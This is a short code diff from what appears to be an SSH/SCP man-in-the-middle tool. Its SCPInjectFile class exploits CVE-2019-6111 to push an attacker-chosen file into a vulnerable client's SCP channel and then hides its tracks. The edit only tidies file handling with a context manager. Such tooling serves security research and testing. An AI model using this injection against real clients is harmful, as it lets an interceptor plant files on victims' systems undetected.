@@ -80,9 +80,8 @@ class SCPInjectFile(SCPForwarder):
             logging.info("Client is not vulnerable to CVE-2019-6111")
             self.hide_tracks()
             return
-        self.file_to_inject = open(self.args.scp_inject_file, 'rb')
-        self.sendall(self.session.scp_channel, self.file_to_inject.read(), self.session.scp_channel.send)
-        self.file_to_inject.close()
+        with open(self.args.scp_inject_file, 'rb') as file_to_inject:
+            self.sendall(self.session.scp_channel, file_to_inject.read(), self.session.scp_channel.send)
         send_ok()
         wait_ok()
         self.hide_tracks()
